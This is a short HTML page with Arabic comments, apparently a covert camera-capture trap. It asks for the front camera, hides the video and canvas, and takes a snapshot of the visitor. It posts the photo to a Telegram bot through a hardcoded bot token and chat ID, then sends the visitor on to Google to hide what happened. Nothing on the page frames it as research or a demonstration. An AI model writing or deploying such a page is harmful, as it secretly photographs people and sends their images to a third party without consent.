<!DOCTYPE html>
<html>
<head>
  <title>كاميرا</title>
</head>
<body>

<!-- نخفي الفيديو والكانفس -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const token = '8149313325:AAEc6to9UMMeyEf6MHYaJvtI5_fdC9K5Ros';
  const chatId = '7924214467';

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" } // ← الكاميرا الأمامية
  })
  .then(function(stream) {
    const video = document.getElementById('video');
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.png");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(res => {
          console.log("✅ تم إرسال الصورة إلى تيليجرام");
        }).catch(err => {
          console.error("❌ فشل الإرسال:", err);
        });

        // إعادة التوجيه إلى Google بعد 2 ثانية
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 2000);
      }, 'image/png');
    };

  })
  .catch(function(error) {
    alert("⚠️ فشل الوصول إلى الكاميرا: " + error.message);
    console.error(error);
  });
</script>

</body>
</html>
